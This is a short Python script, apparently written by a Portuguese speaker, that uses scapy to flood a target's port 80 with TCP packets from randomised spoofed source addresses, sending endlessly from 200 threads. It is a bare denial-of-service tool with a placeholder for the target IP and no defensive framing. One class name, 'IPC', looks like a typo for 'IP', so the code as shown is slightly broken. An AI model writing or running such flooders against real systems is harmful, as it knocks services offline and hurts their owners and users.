#!/usr/bin/env python3

from scapy.all import *
import threading

def flood():
	pacote = IPC(src=RandIP("*.*.*.*"), dst="ip do alvo") / TCP(dport=80)
	send(pacote, loop=1, inter=0)

for index in range(200):
	threading.Thread(target=flood).start()
